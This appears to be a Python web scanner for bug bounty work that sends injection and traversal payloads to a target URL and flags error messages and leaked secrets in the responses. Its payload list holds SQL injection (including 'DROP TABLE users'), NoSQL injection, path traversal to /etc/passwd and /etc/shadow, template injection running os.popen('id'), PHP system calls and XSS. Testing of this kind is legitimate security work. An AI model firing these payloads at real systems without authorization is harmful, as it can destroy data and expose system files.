import requests
from urllib.parse import urlparse, urljoin
import re
from colorama import init, Fore, Style
import time
import json

init(autoreset=True)


def test_error_trigger(url, payload, method='GET', json_data=None):
    """Универсальная функция для тестирования ошибок"""
    try:
        if method == 'GET':
            if '?' in url:
                test_url = f"{url}&{payload}"
            else:
                test_url = f"{url}?{payload}"
            
            response = requests.get(test_url, timeout=10, verify=False)
        elif method == 'POST':
            if json_data:
                response = requests.post(url, json=json_data, timeout=10, verify=False)
            else:
                response = requests.post(url, data=payload, timeout=10, verify=False)
        else:
            response = requests.request(method, url, timeout=10, verify=False)
        
        return response.status_code, response.text, response.headers
    
    except requests.exceptions.Timeout:
        return 408, None, None
    except requests.exceptions.ConnectionError:
        return 503, None, None
    except Exception as e:
        return None, None, None


def analyze_response(content, headers):
    """Улучшенный анализ ответов с расширенными паттернами"""
    findings = []
    severity = 'NONE'

    if not content:
        return findings, severity

    content_lower = content.lower()

    error_patterns = {
        "cloud_secrets": {
            "patterns": [
                "sk_live_",
                "sk_test_",
                "pk_live_",
                "rk_live_",
                "ghp_",
                "gho_",
                "gph_",
                "glpat-",
                "aws_access_key_id",
                "aws_secret_access_key",
                "x-api-key:",
                "authorization: bearer",
                "firebaseio.com",
                "supabase.co/rest/v1",
                "sendgrid.net",
                "twilio.com",
                "plivo.com",
                "mailgun.org",
                "cloudinary.com",
                "algolia.net",
                "pusher.com",
                "intercom.io",
                "segment.io",
                "mixpanel",
                "amplitude",
                "braintree",
                "squareup",
                "paypal.com",
                "stripe.com",
                "recurly",
                "chargify",
                "auth0.com",
                "okta.com",
                "onelogin",
                "mongodb+srv://",
                "redis://",
                "amqp://",
                "s3.amazonaws.com",
                "blob.core.windows.net",
                "storage.googleapis.com",
                "ssh-rsa aaa",
                "-----begin",
                "private key",
                "begin rsa",
                "begin dsa",
                "begin ecdsa",
                "git@github.com:",
                "heroku.com",
                "vercel.com",
                "netlify.com",
                "railway.app",
                "render.com",
                "fly.io",
                "neon.tech",
                "planetscale.com",
                "cockroachlabs.cloud",
                "mongodb.net",
                "documentdb",
                "dynamodb",
                "rds.amazonaws",
                "elasticache",
                "redislabs",

                "cloudflare",
                "akamai",
                "fastly",
                "cloudfront"
            ],
            "severity": "CRITICAL",
            "type": "Cloud Service Secret Disclosure"
        },


        "sensitive_data": {
            "patterns": [
                "db_password",
                "database_password",
                "api_key",
                "secret_key",
                "private_key",
                "password_hash",
                "password_reset_token",
                "session_token",
                "csrf_token",
                "xsrf_token",
                "access_token",
                "refresh_token",
                "oauth_token",
                "jwt_token",
                "bearer_token",
                "mongodb://",
                "postgres://",
                "mysql:host=",
                "postgresql://",
                "redis://",
                "memcached://",
                "elasticsearch://",
                "rabbitmq://",
                "amqp://",
                "smtp_password",
                "email_password",
                "admin_password",
                "root_password",
                "master_key",
                "encryption_key",
                "decryption_key",
                "certificate"
            ],
            "severity": "CRITICAL",
            "type": "Sensitive Data Disclosure"
        },

        "stack_trace": {
            "patterns": [
                "traceback (most recent call last)",
                "stack trace:",
                "fatal error:",
                "uncaught exception",
                "exception in thread",
                "at line",
                "called from",
                "file \"",
                "line ",
                "in ",
                "throw new ",
                "at com.",
                "at org.",
                "at java.",
                "at javax.",
                "at sun.",
                "at io.",
                "at net.",
                "at org.springframework",
                "at django.",
                "at flask.",
                "at express.",
                "at koa.",
                "at fastify.",
                "at hapi.",
                "at rails.",
                "at active_record.",
                "at laravel.",
                "at illuminate.",
                "at symfony.",
                "at zend.",
                "at cakephp.",
                "at codeigniter.",
                "at yii.",
                "at django.db",
                "at sqlalchemy.",
                "at hibernate.",
                "at mybatis.",
                "at entityframework.",
                "at sequelize.",
                "at mongoose.",
                "at prisma.",
                "at typeorm.",
                "at knex."
            ],
            "severity": "HIGH",
            "type": "Stack Trace Disclosure"
        },

        "file_path": {
            "patterns": [
                "/var/www/",
                "/home/",
                "/usr/local/",
                "/etc/",
                "/opt/",
                "/root/",
                "/tmp/",
                "c:\\\\",
                "c:/",
                "program files",
                "windows\\system32",
                ".php on line",
                ".py\", line",
                ".java\", line",
                ".js\", line",
                ".cs\", line",
                ".rb\", line",
                ".go\", line",
                ".rs\", line",
                ".cpp\", line",
                ".h\", line",
                ".hpp\", line",
                ".c\", line",
                ".cc\", line",
                ".cxx\", line",
                ".java\", line",
                ".class\", line",
                ".jar\", line",
                ".war\", line",
                ".ear\", line",
                ".zip\", line",
                ".tar\", line",
                ".gz\", line",
                ".bz2\", line",
                ".xz\", line",
                ".7z\", line",
                ".rar\", line",
                ".iso\", line",
                ".dmg\", line",
                ".exe\", line",
                ".dll\", line",
                ".so\", line",
                ".dylib\", line",
                ".a\", line",
                ".lib\", line",
                ".o\", line",
                ".obj\", line"
            ],
            "severity": "HIGH",
            "type": "File Path Disclosure"
        },

        "database_error": {
            "patterns": [
                "sql syntax",
                "mysql error",
                "postgresql error",
                "sqlite error",
                "oracle error",
                "mssql error",
                "sql server error",
                "query failed",
                "unknown column",
                "syntax error near",
                "duplicate entry",
                "foreign key constraint",
                "primary key constraint",
                "unique constraint",
                "check constraint",
                "not null constraint",
                "table doesn't exist",
                "column doesn't exist",
                "relation does not exist",
                "invalid object name",
                "ora-",
                "pg_",
                "mysql_",
                "mysqli_",
                "pdo_",
                "sqlite_",
                "sqlalchemy",
                "hibernate",
                "entityframework",
                "sequelize",
                "mongoose",
                "prisma",
                "typeorm",
                "knex"
            ],
            "severity": "HIGH",
            "type": "Database Error Disclosure"
        },

        "modern_frameworks": {
            "patterns": [
                "nextjs",
                "react-dom",
                "hydration failed",
                "minified react error",
                "react.development.js",
                "react.production.min.js",
                "vue.runtime.esm.js",
                "avoid app logic that relies on enumerating keys",
                "vue.common.dev.js",
                "vue.common.prod.js",
                "ng0",
                "angular jit compilation failed",
                "zone.js",
                "angular/core",
                "angular/common",
                "angular/router",
                "angular/forms",
                "angular/platform-browser",
                "graphql error",
                "cannot query field",
                "field \"",
                "undefined field",
                "graphql/validation",
                "graphql/execution",
                "graphql/language",
                "graphql/type",
                "graphql/utilities",
                "graphql/error",
                "aws_request_id",
                "lambda",
                "function error",
                "task timed out",
                "lambda_handler",
                "x-amzn-errortype",
                "x-amzn-requestid",
                "azurewebsites.net",
                "gcp-project-id",
                "firebase",
                "cloudflare",
                "heroku",
                "vercel",
                "netlify",
                "railway",
                "render",
                "fly.io",
                "neon.tech",
                "planetscale",
                "cockroachlabs",
                "mongodb.net"
            ],
            "severity": "HIGH",
            "type": "Modern Framework Error Disclosure"
        },

        "api_errors": {
            "patterns": [
                "json.decoder.jsondecodeerror",
                "invalid json",
                "unexpected token",
                "\"errors\": [",
                "\"message\": \"",
                "validation failed",
                "schema validation error",
                "required field missing",
                "invalid type for field",
                "malformed request",
                "bad request",
                "invalid parameter",
                "parameter validation",
                "type mismatch",
                "enum validation",
                "format validation",
                "pattern validation",
                "minimum validation",
                "maximum validation",
                "minlength validation",
                "maxlength validation",
                "minitems validation",
                "maxitems validation",
                "uniqueitems validation"
            ],
            "severity": "MEDIUM",
            "type": "API Error Disclosure"
        },

        "framework_errors": {
            "patterns": [
                "illuminate\\database",
                "django.db.utils",
                "whitelabel error page",
                "server error in '/' application",
                "springframework",
                "flask app",
                "expressjs",
                "koa.js",
                "fastify",
                "hapi.js",
                "rails",
                "laravel",
                "symfony",
                "zend",
                "cakephp",
                "codeigniter",
                "yii",
                "django",
                "flask",
                "express",
                "koa",
                "fastify",
                "hapi"
            ],
            "severity": "HIGH",
            "type": "Framework Error Disclosure"
        },

        "debug_info": {
            "patterns": [
                "debug mode",
                "debug=true",
                "display_errors",
                "notice:",
                "warning:",
                "fatal error",
                "strict standards",
                "deprecated",
                "parse error",
                "syntax error",
                "undefined variable",
                "undefined index",
                "undefined offset",
                "call to undefined function",
                "class not found",
                "interface not found",
                "trait not found",
                "namespace not found",
                "use statement not found",
                "constant not found",
                "function not found",
                "method not found",
                "property not found"
            ],
            "severity": "MEDIUM",
            "type": "Debug Information Disclosure"
        }
    }

    for error_type, config in error_patterns.items():
        for pattern in config['patterns']:
            if pattern.lower() in content_lower:
                findings.append({
                    'type': config['type'],
                    'severity': config['severity'],
                    'pattern': pattern,
                    'context': get_context(content, pattern)
                })


                if config['severity'] == 'CRITICAL':
                    severity = 'CRITICAL'
                elif config['severity'] == 'HIGH' and severity not in ['CRITICAL']:
                    severity = 'HIGH'
                elif config['severity'] == 'MEDIUM' and severity not in ['CRITICAL', 'HIGH']:
                    severity = 'MEDIUM'


    server_header = headers.get('Server', '')
    if server_header and any(keyword in server_header.lower() for keyword in ['apache', 'nginx', 'iis', 'tomcat', 'gunicorn', 'uwsgi']):
        findings.append({
            'type': 'Server Header Disclosure',
            'severity': 'LOW',
            'pattern': server_header,
            'context': f'Server: {server_header}'
        })

    x_powered_by = headers.get('X-Powered-By', '')
    if x_powered_by:
        findings.append({
            'type': 'Technology Stack Disclosure',
            'severity': 'LOW',
            'pattern': x_powered_by,
            'context': f'X-Powered-By: {x_powered_by}'
        })

    sensitive_headers = {
        'X-Debug-Token': 'MEDIUM',
        'X-Runtime': 'LOW',
        'X-Version': 'LOW',
        'X-Backend-Server': 'LOW',
        'X-Cache': 'LOW',
        'X-Served-By': 'LOW',
        'X-Amzn-Trace-Id': 'LOW',
        'X-Correlation-Id': 'LOW',
        'X-Request-Id': 'LOW',
        'Server-Timing': 'LOW',
        'X-AspNet-Version': 'LOW',
        'X-AspNetMvc-Version': 'LOW'
    }

    for header, severity_level in sensitive_headers.items():
        value = headers.get(header, '')
        if value:
            findings.append({
                'type': 'Sensitive Header Disclosure',
                'severity': severity_level,
                'pattern': header,
                'context': f'{header}: {value}'
            })

    return findings, severity


def get_context(content, pattern, context_size=150):
    """Получение контекста вокруг найденного паттерна"""
    match = re.search(re.escape(pattern), content, re.IGNORECASE)
    if match:
        start = max(0, match.start() - context_size)
        end = min(len(content), match.end() + context_size)
        context = content[start:end]
        if len(context) > context_size * 2:
            lines = context.split('\n')
            if len(lines) > 3:
                context = '\n'.join(lines[:3]) + '...'
        return context
    return None


def run():
    """Основная функция запуска сканера"""
    print(f"\n{Fore.CYAN}{'=' * 80}")
    print(f"{Fore.CYAN}║{Fore.GREEN}           ADVANCED ERROR MESSAGE DISCLOSURE SCANNER v2.0              {Fore.CYAN}║")
    print(f"{Fore.CYAN}║{Fore.YELLOW}                   Professional Bug Bounty Edition                       {Fore.CYAN}║")
    print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")

    target = input(
        f"\n{Fore.YELLOW}Enter target URL (e.g., https://example.com/api/users?id=1): {Style.RESET_ALL}").strip()

    if not target:
        print(f"\n{Fore.RED}[!] Empty input. Aborting.{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return

    if not target.startswith(('http://', 'https://')):
        print(f"\n{Fore.RED}[!] URL must start with http:// or https://{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.CYAN}[+] Analyzing error message disclosure for: {target}{Style.RESET_ALL}")

    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/json,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        })


        print(f"\n{Fore.CYAN}{'=' * 80}")
        print(f"{Fore.CYAN}PHASE 1: GET PARAMETER ERROR TRIGGERING TESTS")
        print(f"{Fore.YELLOW}Note: Testing various payloads to trigger error messages{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")

        test_payloads = [

            ('id', "'"),
            ('id', '"'),
            ('id', '1 OR 1=1'),
            ('id', "1' AND 1=CONVERT(int,(SELECT @@version))--"),
            ('id', "1' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT table_name FROM information_schema.tables LIMIT 1)))--"),
            ('id', "1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x3a,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x3a)) USING utf8)))--"),
            ('id', "1' AND 1=(SELECT 1 FROM pg_sleep(5))--"),
            ('id', "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"),
            ('search', "' UNION SELECT NULL,NULL,NULL--"),
            ('sort', "'; DROP TABLE users;--"),

            ('id', '{"$ne":null}'),
            ('filter', '{"$gt":""}'),
            ('query', '{"$where":"sleep(5000)"}'),
            ('email', "admin' || '1'=='1"),
            ('sort', "{'$ne':1}"),

            ('id', '../../../../etc/passwd'),
            ('file', '../../../../../../etc/passwd%00'),
            ('file', '..%2F..%2F..%2Fetc%2Fpasswd'),
            ('path', '%2e%2e%2f%2e%2e%2fetc%2fshadow'),
            ('doc', '....//....//etc/passwd'),

            ('name', "{{7*7}}"),
            ('template', "<%= 7*7 %>"),
            ('search', "${{7*7}}"),
            ('query', "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"),
            ('lang', "{{''.__class__.__mro__[1].__subclasses__()}}"),

            ('query', '{"query":"{__schema{types{name}}}"}'),
            ('variables', '{"id":"\'"}'),

            ('data', '{"id": "invalid_json"}'),
            ('callback', "javascript:alert(1)"),

            ('id', '1&id=2&id=3'),
            ('sort', 'name,id,nonexistent'),

            ('limit', '[]'),
            ('page', '{}'),
            ('count', 'true'),
            ('items', 'null'),
            ('timestamp', 'NaN'),
            ('price', 'Infinity'),
            

            ('token', 'Bearer invalid_jwt_token_here'),
            ('api_key', 'sk_test_' + 'A'*100),
            ('callback', 'https://attacker.com'),
            ('page', 'nonexistentpage'),
            ('limit', '-1'),
            ('offset', '999999999'),
            ('test', '<script>alert(1)</script>'),
            ('param', '${{7*7}}'),
            ('data', '<?php system("id"); ?>'),
            ('cmd', 'cat /etc/passwd'),
            ('debug', '1'),
            ('fields', 'id,name,nonexistent_field,created_at'),
            ('include', 'user,nonexistent_relation,comments'),
            ('version', '999999'),
            ('id', "1'; WAITFOR DELAY '0:0:5'--"),
            ('id', "1' AND SLEEP(5)--")
        ]

        all_findings = []
        total_tests = 0
        vulnerabilities_found = 0

        for param, payload in test_payloads:
            total_tests += 1
            payload_display = payload[:50] + '...' if len(payload) > 50 else payload
            print(f"\n{Fore.CYAN}[→] Test {total_tests}/{len(test_payloads)}: {param}={payload_display}{Style.RESET_ALL}")

            status, content, headers = test_error_trigger(target, f"{param}={payload}")

            if status:
                status_color = Fore.GREEN if status < 400 else (Fore.YELLOW if status < 500 else Fore.RED)
                print(f"    Status: {status_color}{status}{Style.RESET_ALL}")

                findings, severity = analyze_response(content, headers)

                if findings:
                    vulnerabilities_found += 1
                    severity_color = Fore.MAGENTA if severity == 'CRITICAL' else (
                        Fore.RED if severity == 'HIGH' else (Fore.YELLOW if severity == 'MEDIUM' else Fore.CYAN))
                    print(
                        f"    {severity_color}[!] {len(findings)} issue(s) found (Severity: {severity}){Style.RESET_ALL}")

                    for finding in findings[:3]:
                        print(f"      • {finding['type']} ({finding['severity']})")

                    all_findings.extend(findings)
                else:
                    print(f"    {Fore.GREEN}[✓] No sensitive information disclosed{Style.RESET_ALL}")
            else:
                print(f"    {Fore.YELLOW}[?] Request failed (timeout/error){Style.RESET_ALL}")

            time.sleep(0.5) 

        print(f"\n{Fore.CYAN}{'=' * 80}")
        print(f"{Fore.CYAN}PHASE 2: POST JSON API ERROR HANDLING TESTS")
        print(f"{Fore.YELLOW}Note: Testing JSON payloads for API error disclosure{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")

        json_payloads = [
            {"id": "invalid_type"},
            {"filter": {"$ne": "bypass"}},
            {"search": "<script>alert(1)</script>"},
            {"limit": "NaN"},
            {"include": ["user", "nonexistent"]},
            {"fields": "id,name,nonexistent_field"},
            {"data": "${{7*7}}"},
            {"query": "{{7*7}}"},
            {"callback": "javascript:alert(1)"},
            {"token": "Bearer invalid_token_1234567890"},
            {"api_key": "sk_test_" + "A"*100},
            {"password": "invalid_password_with_special_chars!@#$%^&*()"},
            {"email": "invalid_email_format"},
            {"timestamp": "invalid_timestamp"},
            {"price": "Infinity"},
            {"quantity": "-1"},
            {"page": "nonexistent"},
            {"sort": ["name", "invalid_field"]},
            {"filter": {"status": {"$ne": "active"}}},
            {"search": "' OR '1'='1"}
        ]

        for i, json_data in enumerate(json_payloads, 1):
            print(f"\n{Fore.CYAN}[→] JSON Test {i}/{len(json_payloads)}: {str(json_data)[:60]}{Style.RESET_ALL}")
            
            try:
                status, content, headers = test_error_trigger(target, None, method='POST', json_data=json_data)
                
                if status:
                    status_color = Fore.GREEN if status < 400 else (Fore.YELLOW if status < 500 else Fore.RED)
                    print(f"    Status: {status_color}{status}{Style.RESET_ALL}")

                    findings, severity = analyze_response(content, headers)

                    if findings:
                        vulnerabilities_found += 1
                        severity_color = Fore.MAGENTA if severity == 'CRITICAL' else (
                            Fore.RED if severity == 'HIGH' else (Fore.YELLOW if severity == 'MEDIUM' else Fore.CYAN))
                        print(
                            f"    {severity_color}[!] {len(findings)} issue(s) found (Severity: {severity}){Style.RESET_ALL}")

                        for finding in findings[:3]:
                            print(f"      • {finding['type']} ({finding['severity']})")

                        all_findings.extend(findings)
                    else:
                        print(f"    {Fore.GREEN}[✓] No sensitive information disclosed{Style.RESET_ALL}")
                else:
                    print(f"    {Fore.YELLOW}[?] Request failed (timeout/error){Style.RESET_ALL}")
                    
            except Exception as e:
                print(f"    {Fore.YELLOW}[?] Error: {str(e)[:50]}{Style.RESET_ALL}")
            
            time.sleep(0.8)

        print(f"\n{Fore.CYAN}{'=' * 80}")
        print(f"{Fore.CYAN}RESULTS SUMMARY & SECURITY ASSESSMENT")
        print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")

        print(f"\n{Fore.GREEN}Total tests performed: {total_tests + len(json_payloads)}{Style.RESET_ALL}")
        print(f"{Fore.RED}Vulnerabilities found: {vulnerabilities_found}{Style.RESET_ALL}")

        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        for finding in all_findings:
            severity_counts[finding['severity']] += 1

        print(f"\n{Fore.MAGENTA}Critical issues: {severity_counts['CRITICAL']}{Style.RESET_ALL}")
        print(f"{Fore.RED}High severity issues: {severity_counts['HIGH']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Medium severity issues: {severity_counts['MEDIUM']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Low severity issues: {severity_counts['LOW']}{Style.RESET_ALL}")

        if all_findings:
            print(f"\n{Fore.RED}[!] ERROR MESSAGE DISCLOSURE VULNERABILITIES DETECTED{Style.RESET_ALL}")

            critical_findings = [f for f in all_findings if f['severity'] == 'CRITICAL']
            high_findings = [f for f in all_findings if f['severity'] == 'HIGH']

            if critical_findings:
                print(f"\n{Fore.MAGENTA}{Style.BRIGHT}{'=' * 80}")
                print(f" CRITICAL FINDINGS (SECRET DISCLOSURE)")
                print(f"{'=' * 80}{Style.RESET_ALL}")
                for finding in critical_findings[:10]:
                    print(f"\n{Fore.MAGENTA}• {finding['type']}{Style.RESET_ALL}")
                    print(f"  Pattern: {finding['pattern']}")
                    if finding['context']:
                        context_display = finding['context'][:200] + '...' if len(finding['context']) > 200 else finding['context']
                        print(f"  Context: {context_display}")

            if high_findings:
                print(f"\n{Fore.RED}{'=' * 80}")
                print(f" HIGH SEVERITY FINDINGS")
                print(f"{'=' * 80}{Style.RESET_ALL}")
                for finding in high_findings[:15]:
                    print(f"\n{Fore.RED}• {finding['type']}{Style.RESET_ALL}")
                    print(f"  Pattern: {finding['pattern']}")
                    if finding['context']:
                        context_display = finding['context'][:200] + '...' if len(finding['context']) > 200 else finding['context']
                        print(f"  Context: {context_display}")

            print(f"\n{Fore.YELLOW}{'=' * 80}")
            print(f" RISK ASSESSMENT & BUSINESS IMPACT")
            print(f"{'=' * 80}{Style.RESET_ALL}")
            
            if severity_counts['CRITICAL'] > 0:
                risk_level = "CRITICAL"
                risk_color = Fore.MAGENTA
            elif severity_counts['HIGH'] > 0:
                risk_level = "HIGH"
                risk_color = Fore.RED
            elif severity_counts['MEDIUM'] > 0:
                risk_level = "MEDIUM"
                risk_color = Fore.YELLOW
            else:
                risk_level = "LOW"
                risk_color = Fore.CYAN

            print(f"\n{risk_color}Overall Risk Level: {risk_level}{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}Business Impact:{Style.RESET_ALL}")
            print(f"   • Information disclosure enables targeted attacks")
            print(f"   • Stack traces reveal application structure and logic")
            print(f"   • File paths expose server configuration and deployment")
            print(f"   • Database errors reveal schema information")
            print(f"   • Debug info facilitates exploitation")
            print(f"   • Secret keys can lead to account takeover")
            print(f"   • API errors expose internal business logic")

            print(f"\n{Fore.GREEN}{'=' * 80}")
            print(f" CRITICAL RECOMMENDATIONS FOR DEVELOPERS")
            print(f"{'=' * 80}{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}1. Implement Custom Error Pages:{Style.RESET_ALL}")
            print(f"   • Create generic error messages (no technical details)")
            print(f"   • Example: 'An error occurred. Please try again later.'")
            print(f"   • Never display stack traces to users")

            print(f"\n{Fore.YELLOW}2. Disable Debug Mode in Production:{Style.RESET_ALL}")
            print(f"   • PHP: display_errors = Off, error_reporting = 0")
            print(f"   • Python: DEBUG = False, LOG_LEVEL = 'ERROR'")
            print(f"   • Node.js: NODE_ENV=production")
            print(f"   • Java: logging.level.root=ERROR")
            print(f"   • .NET: <customErrors mode=\"On\" />")

            print(f"\n{Fore.YELLOW}3. Configure Web Server Security:{Style.RESET_ALL}")
            print(f"   • Apache: ServerTokens Prod, ServerSignature Off")
            print(f"   • Nginx: server_tokens off;")
            print(f"   • Remove X-Powered-By header")
            print(f"   • Remove Server header or set to generic value")

            print(f"\n{Fore.YELLOW}4. Implement Proper Error Logging:{Style.RESET_ALL}")
            print(f"   • Log errors to secure location (not displayed to users)")
            print(f"   • Use centralized logging (ELK, Splunk, CloudWatch)")
            print(f"   • Monitor for unusual error patterns")
            print(f"   • Set up alerts for critical errors")

            print(f"\n{Fore.YELLOW}5. API Security Best Practices:{Style.RESET_ALL}")
            print(f"   • Validate all input parameters")
            print(f"   • Use schema validation (JSON Schema, OpenAPI)")
            print(f"   • Implement rate limiting")
            print(f"   • Use Web Application Firewall (WAF)")
            print(f"   • Sanitize all error messages")

            print(f"\n{Fore.YELLOW}6. Secret Management:{Style.RESET_ALL}")
            print(f"   • Never hardcode secrets in code")
            print(f"   • Use environment variables or secret managers")
            print(f"   • Rotate keys regularly")
            print(f"   • Implement secret scanning in CI/CD")

            print(f"\n{Fore.YELLOW}7. Regular Security Testing:{Style.RESET_ALL}")
            print(f"   • Conduct penetration testing")
            print(f"   • Use automated security scanning tools")
            print(f"   • Perform code reviews for error handling")
            print(f"   • Monitor security advisories")

        else:
            print(f"\n{Fore.GREEN}[✓] No error message disclosure vulnerabilities detected{Style.RESET_ALL}")
            print(f"\n{Fore.CYAN}Security Best Practices (Maintain These):{Style.RESET_ALL}")
            print(f"   • Continue monitoring error handling")
            print(f"   • Implement centralized error logging")
            print(f"   • Use security headers (CSP, HSTS, X-Frame-Options)")
            print(f"   • Regular code reviews for error handling")
            print(f"   • Implement proper input validation")
            print(f"   • Use automated security scanning tools")
            print(f"   • Keep dependencies updated")
            print(f"   • Conduct regular security audits")


        print(f"\n{Fore.CYAN}{'=' * 80}")
        print(f"{Fore.CYAN}ADDITIONAL SECURITY CHECKS")
        print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")

        print(f"\n{Fore.CYAN}[→] Checking server response headers...{Style.RESET_ALL}")

        try:
            response = session.get(target, timeout=10, verify=False)

            headers_to_check = [
                'Server', 
                'X-Powered-By', 
                'X-AspNet-Version', 
                'X-AspNetMvc-Version',
                'X-Debug-Token',
                'X-Runtime',
                'X-Version',
                'X-Backend-Server',
                'X-Cache',
                'X-Served-By',
                'X-Amzn-Trace-Id',
                'X-Correlation-Id',
                'X-Request-Id',
                'Server-Timing'
            ]

            disclosed_headers = 0
            for header in headers_to_check:
                value = response.headers.get(header)
                if value:
                    disclosed_headers += 1
                    print(f"{Fore.YELLOW}[!] Header disclosed: {header} = {value}{Style.RESET_ALL}")

            if disclosed_headers == 0:
                print(f"{Fore.GREEN}[✓] No sensitive headers disclosed{Style.RESET_ALL}")

            if 'x-debug' in response.headers or 'debug' in response.headers:
                print(f"{Fore.MAGENTA}{Style.BRIGHT}[!] DEBUG MODE DETECTED in headers!{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.YELLOW}[?] Could not check headers: {str(e)[:50]}{Style.RESET_ALL}")

        print(f"\n{Fore.CYAN}{'=' * 80}")
        print(f"{Fore.CYAN}LEGAL & ETHICAL GUIDANCE FOR BUG BOUNTY")
        print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")
        print(f"\n{Fore.RED}  ⚠️  LEGAL WARNING:{Style.RESET_ALL}")
        print(f"   • Triggering errors without authorization may violate laws")
        print(f"   • Error testing may be logged as suspicious activity")
        print(f"   • Always obtain WRITTEN authorization before testing")
        print(f"   • Document all authorized testing activities")
        print(f"   • Never test production systems without explicit permission")
        print(f"   • Respect scope boundaries defined in bug bounty program")

        print(f"\n{Fore.GREEN} ✅ Responsible Testing Guidelines:{Style.RESET_ALL}")
        print(f"   • Test in staging/development environments first")
        print(f"   • Coordinate with system administrators")
        print(f"   • Use low-frequency testing (avoid DoS)")
        print(f"   • Report findings responsibly to owners")
        print(f"   • Provide detailed mitigation recommendations")
        print(f"   • Follow responsible disclosure timeline")

        print(f"\n{Fore.CYAN} 📋 Bug Bounty Reporting Tips:{Style.RESET_ALL}")
        print(f"   • Include clear reproduction steps")
        print(f"   • Provide screenshots with highlighted issues")
        print(f"   • Explain business impact and risk level")
        print(f"   • Suggest specific fixes")
        print(f"   • Be professional and constructive")
        print(f"   • Follow program's submission guidelines")

        print(f"\n{Fore.CYAN}{'=' * 80}")
        print(f"{Fore.GREEN}[✓] Error disclosure analysis completed{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")

        if all_findings:
            filename = f"error_scan_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("ERROR MESSAGE DISCLOSURE SCAN REPORT\n")
                f.write("=" * 80 + "\n\n")
                f.write(f"Target: {target}\n")
                f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Tests: {total_tests + len(json_payloads)}\n")
                f.write(f"Vulnerabilities Found: {vulnerabilities_found}\n\n")
                
                f.write("SEVERITY BREAKDOWN:\n")
                f.write(f"  Critical: {severity_counts['CRITICAL']}\n")
                f.write(f"  High: {severity_counts['HIGH']}\n")
                f.write(f"  Medium: {severity_counts['MEDIUM']}\n")
                f.write(f"  Low: {severity_counts['LOW']}\n\n")
                
                f.write("DETAILED FINDINGS:\n")
                for i, finding in enumerate(all_findings, 1):
                    f.write(f"\n{i}. {finding['type']} ({finding['severity']})\n")
                    f.write(f"   Pattern: {finding['pattern']}\n")
                    if finding['context']:
                        f.write(f"   Context: {finding['context']}\n")
                
                f.write("\n" + "=" * 80 + "\n")
                f.write("RECOMMENDATIONS:\n")
                f.write("=" * 80 + "\n")
                f.write("1. Implement custom error pages\n")
                f.write("2. Disable debug mode in production\n")
                f.write("3. Configure web server security\n")
                f.write("4. Implement proper error logging\n")
                f.write("5. Use Web Application Firewall\n")
            
            print(f"\n{Fore.GREEN}[✓] Full report saved to: {filename}{Style.RESET_ALL}")

    except requests.exceptions.Timeout:
        print(f"\n{Fore.RED}[!] Request timeout. Target may be unreachable.{Style.RESET_ALL}")
    except requests.exceptions.ConnectionError:
        print(f"\n{Fore.RED}[!] Connection error. Check if target is accessible.{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()

    input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
